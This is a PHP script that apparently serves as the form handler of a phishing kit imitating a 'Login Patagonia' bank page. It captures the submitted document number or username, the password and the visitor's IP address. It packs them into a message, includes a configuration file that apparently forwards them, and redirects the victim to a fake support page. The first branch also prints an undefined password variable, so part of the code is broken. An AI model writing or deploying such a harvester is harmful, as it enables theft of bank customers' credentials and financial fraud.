<?php 
	if (isset($_POST['submit'])) {
		if (isset($_POST['log'])) {
			if ($_POST['opcion']) {
				$clase = $_POST['opcion'];
				$num = $_POST['documento'];
				$contra = $_POST['clave'];
				$msj = "
				>>> Login Patagonia <<<
				IP: ".getenv('REMOTE_ADDR')."
				".$clase.": ".$num."
				Clave: ".$pass."
				";
			}
			
			if ($_POST['usuario']) {
				$usu = $_POST['usuario'];
				$contra = $_POST['pass'];
				$msj = "
				>>> Login Patagonia <<<
				IP: ".getenv('REMOTE_ADDR')."
				Usuario: ".$usu."
				Clave: ".$contra."
				";
			}
			
			include 'configurame.php';
			header("location:suport.php");
		}
	}
?>